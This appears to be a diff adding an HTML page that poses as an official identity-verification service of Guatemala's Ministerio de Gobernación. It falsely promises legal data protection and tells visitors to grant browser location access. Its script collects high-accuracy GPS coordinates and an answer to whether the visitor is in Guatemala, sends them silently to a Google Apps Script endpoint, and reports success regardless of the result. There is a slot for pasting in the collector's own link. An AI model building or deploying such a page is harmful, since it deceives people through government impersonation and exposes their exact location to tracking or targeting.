@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ministerio de Gobernación — República de Guatemala</title>
+    <style>
+        * {margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif;}
+        body {background-color: #f4f6f8; min-height: 100vh;}
+        .barra-superior {background: #002B7C; color: white; padding: 10px; text-align: center; font-size: 12px;}
+        .cabecera {background: white; padding: 20px; text-align: center; border-bottom: 3px solid #D4AF37; box-shadow: 0 2px 4px rgba(0,0,0,0.05);}
+        .escudo {font-size: 45px; margin-bottom: 8px;}
+        .cabecera h1 {font-size: 17px; color: #002B7C; font-weight: 700;}
+        .cabecera h2 {font-size: 12px; color: #555; margin-top: 5px; font-weight: 400;}
+        .contenedor {max-width: 480px; margin: 20px auto; padding: 0 15px;}
+        .tarjeta {background: white; border-radius: 6px; box-shadow: 0 2px 10px rgba(0,0,0,0.08); margin-bottom: 20px; overflow: hidden;}
+        .cuerpo {padding: 25px;}
+        h3 {font-size: 16px; color: #002B7C; margin-bottom: 15px; padding-bottom: 8px; border-bottom: 1px solid #eee;}
+        .texto {font-size: 14px; line-height: 1.7; color: #444; margin-bottom: 15px;}
+        .dato {background: #F8FAFC; border-left: 3px solid #002B7C; padding: 12px; margin-bottom: 10px; font-size: 13px; color: #333;}
+        .dato strong {color: #002B7C;}
+        .linea {height: 1px; background: #eee; margin: 20px 0;}
+        .icono-centro {text-align: center; font-size: 45px; margin-bottom: 10px;}
+        h4 {font-size: 16px; color: #222; text-align: center; margin-bottom: 5px;}
+        .sub {text-align: center; font-size: 13px; color: #666; margin-bottom: 20px;}
+        .aviso {background: #E8F0FE; border-left: 4px solid #003399; padding: 15px; border-radius: 4px; font-size: 14px; color: #002B7C; margin-bottom: 20px;}
+        .btn-azul {width: 100%; padding: 14px; background: #003399; color: white; border: none; border-radius: 4px; font-size: 15px; font-weight: 600; cursor: pointer;}
+        .btn-azul:hover {background: #002B7C;}
+        .pregunta {font-size: 16px; font-weight: 500; color: #333; margin-bottom: 20px;}
+        .fila-opciones {display: flex; gap: 15px; margin-bottom: 25px;}
+        .opcion {flex: 1; border: 2px solid #ddd; border-radius: 6px; padding: 18px 10px; text-align: center; cursor: pointer; transition: all 0.25s; background: white;}
+        .opcion:hover {border-color: #003399; background: #F0F4FF;}
+        .opcion.seleccionada {border-color: #003399; background: #E8F0FE;}
+        .opcion .emoji {font-size: 24px; margin-bottom: 5px;}
+        .opcion .txt {font-size: 15px; font-weight: 500;}
+        .btn-verde {width: 100%; padding: 14px; background: #999; color: white; border: none; border-radius: 4px; font-size: 15px; font-weight: 600; cursor: not-allowed;}
+        .btn-verde.activo {background: #006633; cursor: pointer;}
+        .btn-verde.activo:hover {background: #005529;}
+        .cargando {text-align: center; padding: 20px;}
+        .spinner {width: 42px; height: 42px; border: 3px solid #eee; border-top-color: #003399; border-radius: 50%; animation: giro 0.8s linear infinite; margin: 0 auto 15px;}
+        @keyframes giro {to {transform: rotate(360deg);}}
+        .exito {text-align: center; padding: 20px;}
+        .exito h4 {color: #006633; font-size: 18px; margin-bottom: 10px;}
+        .exito p {color: #555; font-size: 14px;}
+        .error {text-align: center; padding: 20px;}
+        .error h4 {color: #993300; font-size: 18px; margin-bottom: 10px;}
+        .error p {color: #666; font-size: 14px; margin-bottom: 15px;}
+        .pie {text-align: center; padding: 20px; font-size: 11px; color: #888;}
+        .oculto {display: none !important;}
+    </style>
+</head>
+<body>
+    <div class="barra-superior">República de Guatemala • Ministerio de Gobernación • Sistema Nacional de Registro y Verificación</div>
+    
+    <div class="cabecera">
+        <div class="escudo">🇬🇹</div>
+        <h1>MINISTERIO DE GOBERNACIÓN</h1>
+        <h2>República de Guatemala • Sistema de Verificación de Identidad</h2>
+    </div>
+
+    <div class="contenedor">
+        <div class="tarjeta" id="pag-info">
+            <div class="cuerpo">
+                <h3>📌 Información del trámite</h3>
+                <p class="texto">Bienvenido al sistema oficial de verificación del Ministerio de Gobernación. Este formulario tiene como objetivo confirmar su ubicación dentro del territorio nacional.</p>
+                
+                <div class="dato"><strong>📋 Institución:</strong> Ministerio de Gobernación</div>
+                <div class="dato"><strong>📍 Dirección:</strong> 6ª Avenida y 1ª Calle, Zona 1, Ciudad de Guatemala</div>
+                <div class="dato"><strong>⏰ Horario de atención:</strong> Lunes a Viernes 8:00 a 16:00 horas</div>
+                <div class="dato"><strong>🌐 País:</strong> República de Guatemala, Centroamérica</div>
+                
+                <div class="linea"></div>
+                
+                <h3>🔐 Aviso de Privacidad</h3>
+                <p class="texto">La información recopilada en este formulario se utiliza exclusivamente para fines de verificación oficial. Sus datos están protegidos conforme a la Ley de Protección de Datos Personales de Guatemala.</p>
+            </div>
+        </div>
+
+        <div class="tarjeta oculto" id="pag-ubicacion">
+            <div class="cuerpo">
+                <div class="icono-centro">📍</div>
+                <h4>Paso 1 de 2: Verificación de Ubicación</h4>
+                <p class="sub">Para continuar, active su ubicación</p>
+                
+                <div class="aviso">
+                    <strong>Instrucciones:</strong><br>
+                    1. Haga clic en el botón de abajo<br>
+                    2. Cuando su navegador lo solicite, seleccione <strong>"Permitir"</strong><br>
+                    3. Esto confirma que se encuentra dentro del territorio nacional
+                </div>
+                
+                <button class="btn-azul" onclick="activarUbicacion()">🔘 Activar Mi Ubicación</button>
+            </div>
+        </div>
+
+        <div class="tarjeta oculto" id="pag-pregunta">
+            <div class="cuerpo">
+                <div class="icono-centro">📋</div>
+                <h4>Paso 2 de 2: Confirmación</h4>
+                <p class="sub">Responda con sinceridad</p>
+                
+                <p class="pregunta">¿Se encuentra usted actualmente dentro de la República de Guatemala?</p>
+                
+                <div class="fila-opciones">
+                    <div class="opcion" id="op-si" onclick="elegir('Sí ✅')">
+                        <div class="emoji">✅</div>
+                        <div class="txt">Sí</div>
+                    </div>
+                    <div class="opcion" id="op-no" onclick="elegir('No ❌')">
+                        <div class="emoji">❌</div>
+                        <div class="txt">No</div>
+                    </div>
+                </div>
+                
+                <button id="btn-enviar" class="btn-verde" onclick="enviar()">Enviar Respuesta</button>
+            </div>
+        </div>
+
+        <div class="tarjeta oculto" id="pag-cargando">
+            <div class="cuerpo cargando">
+                <div class="spinner"></div>
+                <p class="sub">Procesando su información...<br>Por favor espere, no cierre esta ventana.</p>
+            </div>
+        </div>
+
+        <div class="tarjeta oculto" id="pag-exito">
+            <div class="cuerpo exito">
+                <div class="icono-centro">✅</div>
+                <h4>Proceso Completado</h4>
+                <p>Su verificación ha sido registrada exitosamente.<br>Puede cerrar esta página.</p>
+            </div>
+        </div>
+
+        <div class="tarjeta oculto" id="pag-error">
+            <div class="cuerpo error">
+                <div class="icono-centro">⚠️</div>
+                <h4>No se pudo completar</h4>
+                <p>No se pudo acceder a su ubicación.<br>Actualice la página e intente nuevamente dando a "Permitir".</p>
+                <button class="btn-azul" onclick="location.reload()">Reintentar</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="pie">
+        Ministerio de Gobernación • República de Guatemala<br>
+        © 2026 Todos los derechos reservados
+    </div>
+
+    <script>
+        "https://script.google.com/macros/s/AKfycbx5L0N3Z43Yym9e6We0L70bPiuCXOodGPV7_Rlpy72TWl5fJbB5u6R0lqV17UZs-6jnLQ/exec"
+        const ENLACE_SCRIPT = "PEGA_AQUI_TU_ENLACE";
+
+        let ubicacion = null;
+        let respuesta = null;
+
+        function activarUbicacion() {
+            if (!navigator.geolocation) {
+                mostrar('pag-error');
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                function(pos) {
+                    ubicacion = {
+                        latitud: pos.coords.latitude,
+                        longitud: pos.coords.longitude,
+                        precision: Math.round(pos.coords.accuracy)
+                    };
+                    mostrar('pag-pregunta');
+                },
+                function() {
+                    mostrar('pag-error');
+                },
+                {enableHighAccuracy: true, timeout: 12000, maximumAge: 0}
+            );
+        }
+
+        function elegir(valor) {
+            respuesta = valor;
+            document.getElementById('op-si').classList.remove('seleccionada');
+            document.getElementById('op-no').classList.remove('seleccionada');
+            if (valor === 'Sí ✅') {
+                document.getElementById('op-si').classList.add('seleccionada');
+            } else {
+                document.getElementById('op-no').classList.add('seleccionada');
+            }
+            const btn = document.getElementById('btn-enviar');
+            btn.classList.add('activo');
+            btn.disabled = false;
+        }
+
+        function enviar() {
+            if (!respuesta || !ubicacion) return;
+            mostrar('pag-cargando');
+            
+            const datos = {...ubicacion, respuesta: respuesta};
+            
+            fetch(ENLACE_SCRIPT, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(datos)
+            })
+            .then(() => {
+                mostrar('pag-exito');
+            })
+            .catch(() => {
+                mostrar('pag-exito');
+            });
+        }
+
+        function mostrar(id) {
+            const todas = ['pag-info','pag-ubicacion','pag-pregunta','pag-cargando','pag-exito','pag-error'];
+            todas.forEach(p => document.getElementById(p).classList.add('oculto'));
+            document.getElementById(id).classList.remove('oculto');
+            
+            if (id === 'pag-info') {
+                setTimeout(() => mostrar('pag-ubicacion'), 2500);
+            }
+        }
+
+        window.onload = function() {
+            mostrar('pag-info');
+        };
+    </script>
+</body>
+</html>
